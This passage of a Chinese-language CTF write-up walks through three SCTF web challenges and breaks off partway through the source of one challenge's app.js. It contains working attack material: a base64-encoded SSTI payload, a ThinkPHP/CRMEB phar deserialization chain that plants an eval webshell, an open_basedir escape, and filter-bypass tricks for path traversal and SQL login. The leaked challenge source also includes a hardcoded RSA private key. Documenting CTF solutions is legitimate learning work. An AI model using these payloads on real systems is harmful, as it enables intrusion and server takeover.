</span>Token=eyJuYW1lIjogImFkbWluMjA2MCIsICJzZWNyZXQiOiAiZXlKaGJHY2lPaUpJVXpJMU5pSXNJblI1Y0NJNklrcFhWQ0o5LmV5SnVZVzFsSWpvaVlXUnRhVzR5TURZd0lpd2lhWE5mWVdSdGFXNGlPaUl4SW4wLi1maGFqQ1M4S1RfMDY2YWlxSmhqNGxHcHdVdWRMbFprMnh1SlFxUld2Q0kifQ==<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>323<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://124.220.229.60:8080<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Priority</span><span class="hljs-punctuation">: </span>u=0<br><br><span class="language-handlebars"><span class="language-xml">code=</span><span class="hljs-template-variable">&#123;&#123;(<span class="hljs-name">g.pop.__globals__.__builtins__.__getitem__</span>(<span class="hljs-name">&#x27;EXEC&#x27;.lower</span>()))(<span class="hljs-name">&quot;import+base64;ex&quot;</span>%<span class="hljs-number">2</span>b<span class="hljs-string">&quot;ec(base64.b64decode(&#x27;X19pbXBvcnRfXygnc3lzJykubW9kdWxlc1snX19tYWluX18nXS5fX2RpY3RfX1snYXBwJ10uYmVmb3JlX3JlcXVlc3RfZnVuY3Muc2V0ZGVmYXVsdChOb25lLFtdKS5hcHBlbmQobGFtYmRhIDpfX2ltcG9ydF9fKCdvcycpLnBvcGVuKCcvcmVhZGZsYWcnKS5yZWFkKCkp&#x27;));&quot;</span>)&#125;&#125;</span></span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2024/10/05/sctf-web-learning/image-20241005233349472.png" srcset="/img/loading.gif" lazyload alt="image-20241005233349472"></p>
+<h2 id="Simpleshop"><a href="#Simpleshop" class="headerlink" title="Simpleshop"></a>Simpleshop</h2><p>看了一半没看到。</p>
+<p>看了他的letter，注册了个号，修改头像处存在文件上传，但是直接传不行，ban完了。</p>
+<p>下载源码发现ThinkPHP框架，并且找到个未公开的CVE打这个CRMEB的反序列化，挖洞没跑了。</p>
+<p>想办法打phar吧。</p>
+<p>漏洞点在<code>CRMEB-5.4.0\CRMEB-5.4.0\crmeb\app\adminapi\controller</code>的<code>PublicController</code>类中。</p>
+<p>网上找ThinkPHP的反序列化链，有现成的，直接套过来用。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">PhpOffice</span>\<span class="hljs-title class_">PhpSpreadsheet</span>\<span class="hljs-title class_">Collection</span>&#123;<br>    <span class="hljs-title class_">class</span> <span class="hljs-title class_">Cells</span>&#123;<br>        <span class="hljs-title class_">private</span> $<span class="hljs-title class_">cache</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$exp</span></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;cache = <span class="hljs-variable">$exp</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">log</span>&#123;<br>    <span class="hljs-title class_">class</span> <span class="hljs-title class_">Channel</span>&#123;<br>        <span class="hljs-title class_">protected</span> $<span class="hljs-title class_">logger</span>;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$lazy</span> = <span class="hljs-literal">true</span>;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$exp</span></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;logger = <span class="hljs-variable">$exp</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;lazy = <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">think</span>&#123;<br>    <span class="hljs-title class_">class</span> <span class="hljs-title class_">Request</span>&#123;<br>        <span class="hljs-title class_">protected</span> $<span class="hljs-title class_">url</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;url = <span class="hljs-string">&#x27;&lt;?php file_put_contents(&quot;/var/www/public/uploads/store/comment/20240929/fpclose.php&quot;, \&#x27;&lt;?php eval($_POST[1]); ?&gt;\&#x27;, FILE_APPEND); ?&gt;&#x27;</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">App</span></span>&#123;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$instances</span> = [];<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;instances = [<span class="hljs-string">&#x27;think\Request&#x27;</span>=&gt;<span class="hljs-keyword">new</span> <span class="hljs-title class_">Request</span>()];<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">view</span>\<span class="hljs-title class_">driver</span>&#123;<br>    <span class="hljs-title class_">class</span> <span class="hljs-title class_">Php</span>&#123;&#125;<br>&#125;<br><br><span class="hljs-title class_">namespace</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">log</span>\<span class="hljs-title class_">driver</span>&#123;<br>    <span class="hljs-title class_">class</span> <span class="hljs-title class_">Socket</span>&#123;<br>        <span class="hljs-title class_">protected</span> $<span class="hljs-title class_">config</span> = [];<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$app</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><br>            <span class="hljs-variable language_">$this</span>-&gt;config = [<br>                <span class="hljs-string">&#x27;debug&#x27;</span>=&gt;<span class="hljs-literal">true</span>,<br>                <span class="hljs-string">&#x27;force_client_ids&#x27;</span> =&gt; <span class="hljs-number">1</span>,<br>                <span class="hljs-string">&#x27;allow_client_ids&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>                <span class="hljs-string">&#x27;format_head&#x27;</span> =&gt; [<span class="hljs-keyword">new</span> \think\view\driver\Php,<span class="hljs-string">&#x27;display&#x27;</span>],<br>            ];<br>            <span class="hljs-variable language_">$this</span>-&gt;app = <span class="hljs-keyword">new</span> \think\<span class="hljs-title function_ invoke__">App</span>();<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> &#123;<br>    $<span class="hljs-title class_">c</span> = <span class="hljs-title class_">new</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">log</span>\<span class="hljs-title class_">driver</span>\<span class="hljs-title class_">Socket</span>();<br>    <span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> think\log\<span class="hljs-title function_ invoke__">Channel</span>(<span class="hljs-variable">$c</span>);<br>    <span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PhpOffice\PhpSpreadsheet\Collection\Cells</span>(<span class="hljs-variable">$b</span>);<br><br><br>    <span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;phar.readonly&quot;</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&#x27;1.phar&#x27;</span>);<br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);<br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$a</span>);<br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;fpclose.jpg&quot;</span>, <span class="hljs-string">&quot;666&quot;</span>);<br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><code>phar://</code>被ban了，这个看了源码发现其实是直接被替换为空，双写就能绕过。</p>
+<p>文件直接套一个gzip来绕上传内容检测。先改名1.jpg然后gzip 1.jpg。</p>
+<p><img src="/2024/10/05/sctf-web-learning/image-20241005233834211.png" srcset="/img/loading.gif" lazyload alt="image-20241005233834211"></p>
+<p>蚁剑直连，用一下fpm插件绕过disable_functions。</p>
+<p><img src="/2024/10/05/sctf-web-learning/image-20241005233935015.png" srcset="/img/loading.gif" lazyload alt="image-20241005233935015"></p>
+<p>然后里面一个suid-grep提权交了。</p>
+<p>这里翻网上wp发现星盟还真nb，写了个跳板php，然后打iconv来getshell：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-string">&#x27;img&#x27;</span>);<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;img&#x27;</span>);<span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&#x27;..&#x27;</span>);<span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;/&#x27;</span>);<br>    <span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;file&#x27;</span>]);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;File contents: <span class="hljs-subst">$data</span>&quot;</span>;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2024/10/05/sctf-web-learning/image-20241005234147752.png" srcset="/img/loading.gif" lazyload alt="image-20241005234147752"></p>
+<p>这也能想到啊，我草。</p>
+<p>学到一个新的绕disable_functions方法了。</p>
+<h2 id="SycServer2-0"><a href="#SycServer2-0" class="headerlink" title="SycServer2.0"></a>SycServer2.0</h2><p>怪题，出晚了。</p>
+<p>前端绕过很简单，js的waf形同虚设，删了直接sql万能密码进了，拿cookie。</p>
+<p>robots.txt发现一个玩意：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">User-agent: *<br>Disallow:<br>Disallow: /ExP0rtApi?v=<span class="hljs-built_in">static</span>&amp;f=<span class="hljs-number">1</span>.jpeg<br></code></pre></td></tr></table></figure>
+
+<p>猜测这是一个读取文件的接口，结果还真是，替换<code>../</code>为空，双写绕了。</p>
+<p>然后就可以读到app.js:</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>);<br><span class="hljs-keyword">var</span> nodeRsa = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;node-rsa&#x27;</span>);<br><span class="hljs-keyword">const</span> bodyParser = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;body-parser&#x27;</span>);<br><span class="hljs-keyword">const</span> jwt = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;jsonwebtoken&#x27;</span>);<br><span class="hljs-keyword">const</span> crypto = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;crypto&#x27;</span>);<br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">SECRET_KEY</span> = crypto.<span class="hljs-title function_">randomBytes</span>(<span class="hljs-number">16</span>).<span class="hljs-title function_">toString</span>(<span class="hljs-string">&#x27;hex&#x27;</span>);<br><span class="hljs-keyword">const</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;path&#x27;</span>);<br><span class="hljs-keyword">const</span> zlib = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;zlib&#x27;</span>);<br><span class="hljs-keyword">const</span> mysql = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;mysql&#x27;</span>)<br><span class="hljs-keyword">const</span> handle = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;./handle&#x27;</span>);<br><span class="hljs-keyword">const</span> cp = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>);<br><span class="hljs-keyword">const</span> cookieParser = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;cookie-parser&#x27;</span>);<br><br><span class="hljs-keyword">const</span> con = mysql.<span class="hljs-title function_">createConnection</span>(&#123;<br>  <span class="hljs-attr">host</span>: <span class="hljs-string">&#x27;localhost&#x27;</span>,<br>  <span class="hljs-attr">user</span>: <span class="hljs-string">&#x27;ctf&#x27;</span>,<br>  <span class="hljs-attr">password</span>: <span class="hljs-string">&#x27;ctf123123&#x27;</span>,<br>  <span class="hljs-attr">port</span>: <span class="hljs-string">&#x27;3306&#x27;</span>,<br>  <span class="hljs-attr">database</span>: <span class="hljs-string">&#x27;sctf&#x27;</span><br>&#125;)<br>con.<span class="hljs-title function_">connect</span>(<span class="hljs-function">(<span class="hljs-params">err</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">if</span> (err) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">&#x27;Error connecting to MySQL:&#x27;</span>, err.<span class="hljs-property">message</span>);<br>    <span class="hljs-built_in">setTimeout</span>(con.<span class="hljs-title function_">connect</span>(), <span class="hljs-number">2000</span>); <span class="hljs-comment">// 2ç§åéè¯è¿æ¥</span><br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Connected to MySQL&#x27;</span>);<br>  &#125;<br>&#125;);<br><br><span class="hljs-keyword">const</span> &#123;response&#125; = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;express&quot;</span>);<br><span class="hljs-keyword">const</span> req = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;express/lib/request&quot;</span>);<br><br><span class="hljs-keyword">var</span> key = <span class="hljs-keyword">new</span> <span class="hljs-title function_">nodeRsa</span>(&#123; <span class="hljs-attr">b</span>: <span class="hljs-number">1024</span> &#125;);<br>key.<span class="hljs-title function_">setOptions</span>(&#123; <span class="hljs-attr">encryptionScheme</span>: <span class="hljs-string">&#x27;pkcs1&#x27;</span> &#125;);<br><br><span class="hljs-keyword">var</span> publicPem = <span class="hljs-string">`-----BEGIN PUBLIC KEY-----\nMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC5nJzSXtjxAB2tuz5WD9B//vLQ\nTfCUTc+AOwpNdBsOyoRcupuBmh8XSVnm5R4EXWS6crL5K3LZe5vO5YvmisqAq2IC\nXmWF4LwUIUfk4/2cQLNl+A0czlskBZvjQczOKXB+yvP4xMDXuc1hIujnqFlwOpGe\nI+Atul1rSE0APhHoPwIDAQAB\n-----END PUBLIC KEY-----`</span>;<br><span class="hljs-keyword">var</span> privatePem = <span class="hljs-string">`-----BEGIN PRIVATE KEY-----</span><br><span class="hljs-string">MIICeAIBADANBgkqhkiG9w0BAQEFAASCAmIwggJeAgEAAoGBALmcnNJe2PEAHa27</span><br><span class="hljs-string">PlYP0H/+8tBN8JRNz4A7Ck10Gw7KhFy6m4GaHxdJWeblHgRdZLpysvkrctl7m87l</span><br><span class="hljs-string">i+aKyoCrYgJeZYXgvBQhR+Tj/ZxAs2X4DRzOWyQFm+NBzM4pcH7K8/jEwNe5zWEi</span><br><span class="hljs-string">6OeoWXA6kZ4j4C26XWtITQA+Eeg/AgMBAAECgYA+eBhLsUJgckKK2y8StgXdXkgI</span><br><span class="hljs-string">lYK31yxUIwrHoKEOrFg6AVAfIWj/ZF+Ol2Qv4eLp4Xqc4+OmkLSSwK0CLYoTiZFY</span><br><span class="hljs-string">Jal64w9KFiPUo1S2E9abggQ4omohGDhXzXfY+H8HO4ZRr0TL4GG+Q2SphkNIDk61</span><br><span class="hljs-string">khWQdvN1bL13YVOugQJBAP77jr5Y8oUkIsQG+eEPoaykhe0PPO408GFm56sVS8aT</span><br><span class="hljs-string">6sk6I63Byk/DOp1MEBFlDGIUWPjbjzwgYouYTbwLwv8CQQC6WjLfpPLBWAZ4nE78</span><br><span class="hljs-string">dfoDzqFcmUN8KevjJI9B/rV2I8M/4f/UOD8cPEg8kzur7fHga04YfipaxT3Am1kG</span><br><span class="hljs-string">mhrBAkEA90J56ZvXkcS48d7R8a122jOwq3FbZKNxdwKTJRRBpw9JXllCv/xsc2ye</span><br><span class="hljs-string">KmrYKgYTPAj/PlOrUmMVLMlEmFXPgQJBAK4V6yaf6iOSfuEXbHZOJBSAaJ+fkbqh</span><br><span class="hljs-string">UvqrwaSuNIi72f+IubxgGxzed8EW7gysSWQT+i3JVvna/tg6h40yU0ECQQCe7l8l</span><br><span class="hljs-string">zIdwm/xUWl1jLyYgogexnj3exMfQISW5442erOtJK8MFuUJNHFMsJWgMKOup+pOg</span><br><span class="hljs-string">xu/vfQ0A1jHRNC7t</span><br><span class="hljs-string">-----END PRIVATE KEY-----`</span>;<br><br><span class="hljs-keyword">const</span> app = <span class="hljs-title function_">express</span>();<br>app.<span class="hljs-title function_">use</span>(bodyParser.<span class="hljs-title function_">json</span>());<br>app.<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">urlencoded</span>(&#123; <span class="hljs-attr">extended</span>: <span class="hljs-literal">true</span> &#125;));<br>app.<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">static</span>(path.<span class="hljs-title function_">join</span>(__dirname, <span class="hljs-string">&#x27;static&#x27;</span>)));<br>app.<span class="hljs-title function_">use</span>(<span class="hljs-title function_">cookieParser</span>());<br><br><span class="hljs-keyword">var</span> <span class="hljs-title class_">Reportcache</span> = &#123;&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">verifyAdmin</span>(<span class="hljs-params">req, res, next</span>) &#123;<br>  <span class="hljs-keyword">const</span> token = req.<span class="hljs-property">cookies</span>[<span class="hljs-string">&#x27;auth_token&#x27;</span>];<br><br>  <span class="hljs-keyword">if</span> (!token) &#123;<br>    <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">403</span>).<span class="hljs-title function_">json</span>(&#123; <span class="hljs-attr">message</span>: <span class="hljs-string">&#x27;No token provided&#x27;</span> &#125;);<br>  &#125;<br><br>  jwt.<span class="hljs-title function_">verify</span>(token, <span class="hljs-variable constant_">SECRET_KEY</span>, <span class="hljs-function">(<span class="hljs-params">err, decoded</span>) =&gt;</span> &#123;<br>    <span class="hljs-keyword">if</span> (err) &#123;<br>      <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">403</span>).<span class="hljs-title function_">json</span>(&#123; <span class="hljs-attr">message</span>: <span class="hljs-string">&#x27;Failed to authenticate token&#x27;</span> &#125;);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (decoded.<span class="hljs-property">role</span> !== <span class="hljs-string">&#x27;admin&#x27;</span>) &#123;<br>      <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">403</span>).<span class="hljs-title function_">json</span>(&#123; <span class="hljs-attr">message</span>: <span class="hljs-string">&#x27;Access denied. Admins only.&#x27;</span> &#125;);<br>    &#125;<br><br>    req.<span class="hljs-property">user</span> = decoded;<br>    <span class="hljs-title function_">next</span>();<br>  &#125;);<br>&#125;<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/hello&#x27;</span>, verifyAdmin ,<span class="hljs-function">(<span class="hljs-params">req, res</span>)=&gt;</span> &#123;<br>  res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;&lt;h1&gt;Welcome Admin!!!&lt;/h1&gt;&lt;br&gt;&lt;img src=&quot;./1.jpeg&quot; /&gt;&#x27;</span>);<br>&#125;);<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/config&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  res.<span class="hljs-title function_">json</span>(&#123;<br>    <span class="hljs-attr">publicKey</span>: publicPem,<br>  &#125;);<br>&#125;);<br><br><span class="hljs-keyword">var</span> decrypt = <span class="hljs-keyword">function</span>(<span class="hljs-params">body</span>) &#123;<br>  <span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-keyword">var</span> pem = privatePem;<br>    <span class="hljs-keyword">var</span> key = <span class="hljs-keyword">new</span> <span class="hljs-title function_">nodeRsa</span>(pem, &#123;<br>      <span class="hljs-attr">encryptionScheme</span>: <span class="hljs-string">&#x27;pkcs1&#x27;</span>,<br>      <span class="hljs-attr">b</span>: <span class="hljs-number">1024</span><br>  